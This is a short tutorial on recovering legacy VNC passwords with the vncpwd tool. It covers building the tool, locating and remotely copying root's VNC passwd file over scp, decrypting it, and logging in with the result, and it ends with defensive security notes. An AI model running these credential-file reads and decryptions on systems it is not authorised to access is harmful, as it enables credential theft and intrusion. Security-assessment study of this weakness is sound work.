VNC servers typically store passwords in a file called `passwd`, which is not plaintext but is weakly encrypted using the 3DES algorithm. The tool `vncpwd` can be used to decrypt VNC password files and recover the actual password.

```
vncpasswd
```

---

## 1. Download and Build vncpwd

Clone the repository and compile the tool:

```
git clone https://github.com/jeroennijhof/vncpwd.git
```

```
cd vncpwd
```

```
make
```

To build a 32-bit version:

```
gcc -m32 -Wall -g -o vncpwd32 vncpwd.c d3des.c
```

**Notes:**

- `make` builds the default binary.
- The GCC command creates a 32-bit executable for environments requiring 32-bit compatibility.

---

## 2. Locate the VNC Password File

Common locations include:

```
/home/<user>/.vnc/passwd
```

```
/root/.vnc/passwd
```

The password file location may also be specified when the VNC server is started.

Example of copying the password file from a remote system:

```
scp -oHostKeyAlgorithms=+ssh-rsa root@192.168.1.235:/root/.vnc/passwd .
```

```
ssh -oHostKeyAlgorithms=+ssh-rsa root@192.168.10.110
```

---

## 3. Recover the Password

Run `vncpwd` against the password file:

```
./vncpwd /home/armour/passwd
```

Alternatively:

```
vncpwd <vnc_password_file>
```

```
vncpwd32 <vnc_password_file>
```

```
./vncpwd passwd
```

> The recovered password will be displayed on the terminal.
> 

---

## 4. Example

```
cd vncpwd
```

```
./vncpwd /root/.vnc/passwd
```

Example output:

```
Password: hunter2
```

The recovered password can then be used to authenticate to the corresponding VNC service.

---

## 5. Security Considerations

- Traditional VNC password storage uses a weak encryption mechanism.
- The DES key used for password protection is static and publicly known.
- Password recovery can be performed offline if the `passwd` file is obtained.
- Restrict access to VNC services and use strong authentication mechanisms whenever possible.
- Consider tunneling VNC through SSH or VPNs and limiting network exposure.

## Conclusion

The `vncpwd` utility demonstrates the weakness of legacy VNC password storage by recovering passwords from VNC password files. Understanding this weakness is useful when assessing the security of systems that rely on traditional VNC authentication mechanisms.
